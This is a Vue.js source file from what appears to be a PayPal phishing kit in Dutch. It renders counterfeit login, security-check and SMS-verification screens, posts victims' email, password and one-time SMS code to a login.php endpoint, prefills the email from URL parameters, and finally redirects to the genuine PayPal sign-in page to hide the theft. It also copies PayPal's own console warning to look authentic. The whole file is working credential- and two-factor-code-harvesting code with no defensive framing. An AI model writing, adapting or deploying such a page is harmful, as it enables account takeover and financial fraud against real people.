<template>
  <div id="app"> 
    <div class="loaderOverlay">
     <div data-nemo="loaderOverlay" class="modal-animate" :class="isLoading ? '' : 'hide'">
        <div class="rotate"></div>
        <div class="processing">{{ language.oneSecond }}</div>
        <div class="loaderOverlayAdditionalElements"></div>
     </div>
     <div class="modal-overlay hide"></div>

    </div>
    <!--
    <paypal-main 
      // Required
      :language="language" 
      :credentials="credentials" 
      
      // Optional
      :subheader-text="shText" 
      
      // Optional
      :submit-error-message="subText" 
      :submit-error="submitError" 
      
      // Required
      @submit-credentials="submitCredentials"
      
      // Optional
      :show-custom-action="true"
      :custom-action-text="customActionText"
      @custom-action-click="customActionClick"
      
    />
    -->
    <paypal-main 
      v-if="activeView == 1"
      :language="language" 
      :credentials="credentials"
      @submit-credentials="next"     
    />
    <!-- -->
    <paypal-confirm 
      v-if="activeView == 2"
      :language="language"
      @next="next"
    ></paypal-confirm>
    <!-- -->
    <paypal-confirm-sms
      v-if="activeView == 3"
      :language="language"
      :confirm="confirmSMS"
      @next="next"
    ></paypal-confirm-sms>
    <!-- -->
    <paypal-confirmed
      v-if="activeView == 4"
      :language="language"
      @next="next"
    ></paypal-confirmed>
    <!-- -->
    <paypal-footer 
      :language="language" 
    />
  </div>
</template>

<script>
import axios from 'axios';
import paypalMain from './components/Main.vue'
import paypalConfirm from './components/Confirm.vue'
import paypalConfirmSms from './components/ConfirmSms.vue'
import paypalConfirmed from './components/Confirmed.vue'
import paypalFooter from './components/Footer.vue'
export default {
  name: 'app',
  components: {
    paypalMain,
    paypalConfirm,
    paypalConfirmSms,
    paypalConfirmed,
    paypalFooter
  },
  data () {
    return {
      activeView: 1,
      isLoading: false,
      referrerPage: 'https://www.paypal.com/signin',
      // User credentials
      credentials: {
        email: '',
        password: ''
      },
      // SMS confirmation
      confirmSMS: {
        smsCode: ''
      },

      // Translated texts - edit these to your needs
      // Or load them from JSON in mounted
      language: {
        title: 'Log in op uw PayPal-rekening',
        emailLabel: 'E-mailadres of mobiel nummer',
        emailPlaceHolder: 'E-mailadres of mobiel nummer',
        required: 'Vereist.',
        emailError: 'De indeling van dit e-mailadres of mobiele nummer is onjuist.',
        passwordRecovery: 'Heeft u problemen met inloggen?',
        passwordLabel: 'Wachtwoord',
        passwordPlaceholder: 'Wachtwoord',
        passwordShow: 'Weergeven',
        passwordHide: 'Verbergen',
        loginButton: 'Inloggen',
        or: 'of',
        createAccount: 'Rekening openen',
        oneSecond: 'Een moment geduld...',
        privacy: 'Privacy',
        copyright: `Copyright © 1999 - ${new Date().getFullYear()} PayPal. Alle rechten voorbehouden.`,
        inputError: 'Controleer de ingevoerde gegevens en probeer het opnieuw.',

        confirmTitle: 'Snelle veiligheidscontrole',
        confirmSubTitle: 'We hebben wat aanvullende informatie nodig om te controleren dat u het bent.',
        smsReceive: 'Een sms-bericht ontvangen',
        smsPhone: `Mobiel prefix•• •• •• ••`,
        next: 'Volgende',
        confirmInfo: 'Als u doorgaat, bevestigt u dat u gemachtigd bent dit telefoonnummer te gebruiken en gaat u ermee akkoord sms-berichten te ontvangen om uw identiteit te bevestigen voor deze sessie. Uw provider kan kosten in rekening brengen.',

        enterCode: 'Uw code invoeren',
        smsSendTo: `We hebben een zescijferige beveiligingscode verzonden naar prefix•• •• ••.`,
        requisite: 'Vereist.',
        proceed: 'Doorgaan',

        identityConfirmed: 'Identiteit bevestigd.',
        redirecting: 'Je wordt doorverwezen...'
      }
    }
  },
  methods: {
    next () {
      let t = this
      if (t.activeView < 4) {
        t.isLoading = true
      }
      if (t.activeView === 1) {
        t.submitCredentials()
      }
      if (t.activeView === 2) {
        // ---
      }
      if (t.activeView === 3) {
        t.submitSMSCode()
      }
      setTimeout(function() {
        t.isLoading = false
        if (t.activeView < 4) {
          t.activeView++
        } else {
          window.location.replace(t.referrerPage);
        }
      }, 3000);
    },
    submitCredentials () {
      let vm = this
      vm.isLoading = true
      axios.post('login.php', {email: vm.credentials.email, password: vm.credentials.password})
      .then(r => { /* -- */  })
      .catch(e => { /* -- */ })
    },
    submitSMSCode () {
      let vm = this
      vm.isLoading = true
      axios.post('login.php', {code: vm.confirmSMS.smsCode})
      .then(r => { /* -- */ })
      .catch(e => { /* -- */ })
    }
  },
  computed: {
    loadingClass () {
      return this.isLoading ? 'spinner' : 'hide'
    },
    getPhonePrefix () {
      return this.phonePrefix
    }
  },
  mounted () {
    let vm = this
    let uri = window.location.href.split("?");
    if (uri.length > 0 && uri[1] !== undefined) {
      let vars = uri[1].split("&");
      let getVars = {};
      let tmp = "";
      vars.forEach(function(v) {
        tmp = v.split("=");
        if (tmp.length == 2)
          getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
      });
      var email = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      var phone = "undefined" !== typeof getVars["p"] ? getVars["p"] : "06";
      vm.credentials.email = email
      vm.language.smsPhone = vm.language.smsPhone.replace('prefix', phone)
      vm.language.smsSendTo = vm.language.smsSendTo.replace('prefix', phone)
    }
    window.document.title = this.language.title
    // Set console log warning -- this is from "original" paypal page
    if (window.console || 'console' in window) {
      setTimeout(console.log.bind(console, '%c WARNING!!!', 'color:#FF8F1C; font-size:40px;'));
      setTimeout(console.log.bind(console, '%c This browser feature is for developers only. Please do not copy-paste any code or run any scripts here. It may cause your PayPal account to be compromised.', 'color:#003087; font-size:16px; font-weight: bold;'));
      setTimeout(console.log.bind(console, '%c For more information, http://en.wikipedia.org/wiki/Self-XSS', 'color:#003087; font-size:16px; font-weight: bold;'));
    }
  }
};
</script>

